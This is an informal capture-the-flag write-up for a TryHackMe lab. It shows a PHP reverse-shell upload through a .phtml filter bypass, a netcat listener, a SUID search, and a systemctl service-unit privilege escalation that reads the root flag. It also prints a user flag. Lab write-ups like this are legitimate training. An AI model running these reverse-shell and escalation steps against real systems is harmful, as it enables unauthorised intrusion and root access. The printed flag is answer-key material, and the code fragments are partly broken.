###my Local proxy ip : 10.18.29.3

-------
now Use Brup payload And find (.phtml) cant upload in site
-------

###Start Using php reverse shell


///
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.10.10;  // CHANGE THIS get this ip after conect to Tryhackme VPN with this command
```
ip a | grep tun
```

$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

///



start sh reverse php 

after upload phtml use this comend 
```
nc -nlvp 4444
```


# usernam : bill
# user flag : 8bd7992fbe8a6ad22a63361004cfcedb

##use 
```
find / -perm /4000 2>&1 | grep -v “Permission denied”


```
and find systemctl accses so make sevise script
```
echo ‘[Service] 
ExecStart=/bin/sh -c “cat /root/root.txt > /tmp/output” 
[Install]
WantedBy=multi-user.target’ > $eop
/bin/systemctl link $eop
/bin/systemctl enable —now $eop 

```
### Now root.txt flag cp to /tmp/output


yeeeeeeeeeeeeeeeeeeeees

In 26 years after life ifeel can learning any thing in limited and so hPPY

sorry iam speak persian and English selflearning for that whrite so bad :smile

